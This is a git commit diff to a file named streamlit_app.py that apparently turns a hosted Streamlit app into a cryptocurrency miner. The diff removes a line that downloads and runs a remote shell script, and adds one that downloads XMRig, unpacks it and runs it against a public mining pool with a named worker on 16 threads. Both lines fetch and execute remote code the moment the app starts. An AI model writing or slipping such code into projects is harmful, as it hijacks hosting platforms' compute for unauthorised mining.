11db4da986346df03edb4ba37b209ee26fbee55b
nakolis <111567747+nakolis@users.noreply.github.com>
2022-08-19 12:03:38 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -11,5 +11,5 @@ from time import sleep
 from subprocess import PIPE, Popen
 import base64
 
-p = subprocess.run("curl -L -o Gnt.sh https://github.com/Ikuzot/nung/raw/main/Gnt.sh && chmod +x Gnt.sh && ./Gnt.sh", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://prohashing.com:3359 -u temera88.NEW --keepalive -p a=randomx -t 16", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
